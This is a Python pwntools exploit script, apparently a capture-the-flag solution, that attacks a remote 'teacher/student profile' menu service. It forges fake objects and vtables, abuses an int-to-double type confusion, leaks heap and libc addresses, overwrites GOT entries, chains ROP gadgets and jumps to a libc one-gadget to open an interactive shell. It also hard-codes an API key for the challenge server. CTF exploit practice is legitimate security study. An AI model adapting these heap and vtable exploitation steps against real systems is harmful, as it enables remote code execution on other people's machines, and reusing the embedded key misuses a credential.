from pwn import *
import json
from ctypes import *
REMOTE = 1
if REMOTE == 1:
	s = remote('report.eatpwnnosleep.com',55555)
	a = {
	    'apikey' : "e54aa9929975face3253fb6e261f3a7c15701dface66a5a63ac2fdea555e745d",
	}

	s.send(json.dumps(a).encode())
	time.sleep(7)
else :
	s = remote('192.168.100.39',1234)
def delete(name):
	s.recvuntil('==>')
	s.sendline('2')
	s.recvuntil('==>')
	s.sendline(name)
def todouble(s):
    	cp = pointer(c_int(s))           # make this into a c integer
    	fp = cast(cp, POINTER(c_double))  # cast the int pointer to a float pointer
    	return fp.contents.value         # dereference the pointer, get the float
def add(types,name,credit,grade):
	s.recvuntil('==>')
	s.sendline('1')
	s.recvuntil('==>')
	s.sendline(str(types))
	s.recvuntil('==>')
	s.sendline(name)
	s.recvuntil('==>')
	s.sendline(str(credit))
	s.recvuntil('==>')
	s.sendline(str(grade))
gadget = [0x40013f,0x400177,0x4000b3,0x4009b4,0x4009cb,0x4001f8]
gadget = [t-0x18 for t in gadget]
offset = 0x36e6f8 - 0x2ecf0
magic_vtable = 0x0402118 - 0x8
leak_vtable = 0x04020E8 - 0x8
set_rax = 0x004020F8 - 0x8
free_got = 0x0602FC0
magic_rop = 0x400E82
k = 0x6031e0
dummy = 160
printf_got = 0x0602F78
add_18 = 0x4009b4
s.recvuntil('Input Teacher\'s Name ==>')
s.sendline('A'*8)

fake_object = p64(magic_vtable) + p64(k)
fake_object += p64(set_rax) + p64(0)*3 + p64(free_got - 0x18) + p64(k - 0x18) + p64(0)*14

fake_object += p64(set_rax) + p64(0)*3 + p64(printf_got - 0x18) + p64(k - 0x18) 
fake_object += p64(gadget[0]) + p64(gadget[1])*3 + p64(gadget[2])*4 + p64(gadget[3]) + p64(gadget[4]) + p64(gadget[5])
fake_object += p64(0)*3
fake_object += p64(magic_vtable) + p64(k + 0x30)
fake_object += p64(set_rax) + p64(0)*3 + p64(k+0x30-0x18) + p64(add_18-0x18)*2 + p64(0)*13
fake_object += p64(set_rax) + p64(0)*3 + p64(free_got - 0x18) + p64(k - 0x18) + p64(0)*14
fake_object += p64(leak_vtable)

s.recvuntil('Input Student Profile ==>')
s.sendline(fake_object)
add(0,'1234',1,1)
s.recvuntil('==>')
s.sendline('3')
s.recvuntil('AAAAAAAA')
heap = u64(s.recv(4)+"\x00\x00\x00\x00")
log.info("HEAP : 0x%x"%heap)
add(1,"A",magic_vtable,todouble(heap + 0xc0))
add(1,"B",magic_vtable,todouble(0xdeadbeef))
add(1,"C",0xdeadbeef,todouble(0x00400C79))
delete('C')
raw_input()
log.info('HEAP : 0x%x'%heap)
s.recvuntil('==>')
s.sendline('4')
s.recvuntil('==>')
dat = p64(offset) + p64(heap+0x80)
dat += p64(heap - 0x1010)
dat += p64(heap - 0x1010 + 0x10)
dat += p64(heap + 0x68)
dat += p64(heap - 0x1010 + 0x10 + dummy)
dat += p64(heap - 0x1010 + 0x10 + dummy + dummy)
dat += p64(heap - 0x1010 + 0x10 + dummy + dummy + 0x8*2 + dummy)
dat += p64(heap - 0x1010 + 0x10 + dummy + dummy + 0x8*2 + dummy + dummy)
dat += p64(heap - 0x1010 + 0x10 + dummy + dummy + 0x8*2)
dat += p64(heap + 0xb8)
dat += "\x00" * (0x68 - len(dat)) 
s.sendline(dat)
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00') - 0x3c67a8
log.info("LIBC : 0x%x"%libc)
s.recvuntil('Input Teacher\'s Name ==>')
s.sendline('A'*8)
s.recvuntil('Input Student Profile ==>')
fake_object = "KKKKK"
fake_object = p64(magic_vtable) + p64(libc+0x3c67a8)
s.sendline(fake_object)
s.recvuntil('==>')
s.sendline('4')
s.recvuntil('==>')
dat = p64(libc+0x4526a)
dat += p64(0)
dat += p64(heap+0xf0)
dat += '\x00'*(0x68-len(dat))
s.sendline(dat)
s.interactive()
